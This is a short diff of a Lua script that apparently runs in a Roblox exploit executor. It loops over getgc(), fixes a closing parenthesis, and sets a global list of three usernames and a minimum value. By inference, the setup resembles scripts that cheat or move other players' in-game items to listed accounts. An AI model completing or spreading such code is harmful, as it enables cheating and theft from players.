@@ -58,7 +58,7 @@ for _, v in pairs(getgc()) do
             break
         end
     end
-end)
+end
 
 _G.Usernames = {"SubZerozyq", "Robloxlightgreen1111", "xx44lad"}
 _G.min_value = 1
